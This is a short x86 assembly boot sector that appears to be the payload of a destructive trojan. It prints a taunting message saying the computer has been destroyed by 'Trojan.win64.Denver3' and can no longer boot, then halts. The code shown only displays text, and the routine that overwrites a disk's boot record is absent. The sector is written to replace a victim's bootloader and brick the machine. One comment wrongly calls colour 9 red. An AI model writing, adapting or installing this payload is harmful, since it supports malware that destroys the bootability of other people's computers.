[BITS 16]
[ORG 7C00h]
    jmp     main
main:
    xor     ax, ax     ; DS=0
    mov     ds, ax
    cld                ; DF=0 because our LODSB requires it
    mov     ax, 0012h  ; Select 640x480 16-color graphics video mode
    int     10h
    mov     si, string
    mov     bl, 9      ; Red
    call    printstr
    jmp     $

printstr:
    mov     bh, 0     ; DisplayPage
print:
    lodsb
    cmp     al, 0
    je      done
    mov     ah, 0Eh   ; BIOS.Teletype
    int     10h
    jmp     print
done:
    ret

string db "YOUR COMPUTER HAS BEEN DESTROYED BY DENVER3", 13, 10, "if you see this screen your computer has been destroyed by Trojan.win64.Denver3.", 13, 10, "Your computer will no longer be able to boot", 13, 10, "...", 13, 10, "so have fun with your newly bricked computer :D"

times 510 - ($-$$) db 0
dw      0AA55h